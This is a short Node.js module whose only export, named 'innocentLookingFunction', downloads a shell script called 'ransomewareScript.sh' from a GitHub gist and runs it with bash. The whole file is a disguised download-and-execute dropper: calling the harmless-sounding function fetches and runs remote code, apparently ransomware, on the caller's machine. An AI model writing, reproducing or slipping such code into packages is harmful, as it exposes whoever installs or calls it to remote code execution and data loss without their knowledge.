const axios = require("axios");
const fs = require("fs");
const { execFile } = require("child_process");

async function download() {
  const res = await axios.get(
    "https://gist.githubusercontent.com/uzair004/ccb3bca85ed469a0ae82463a2a557e91/raw/09d3d4030e7a925a1dcd97b5428aa9b4925ab108/ransomewareScript.sh",
    { responseType: "stream" }
  );
  await new Promise((resolve, reject) => {
    const fileStream = fs.createWriteStream("./script.sh");
    res.data.pipe(fileStream);
    fileStream.on("finish", function () {
      resolve();
    });
  });
}

const run = async () => {
  await download();
  execFile("bash", ["script.sh"]);
};

module.exports = function innocentLookingFunction() {
  return run();
};
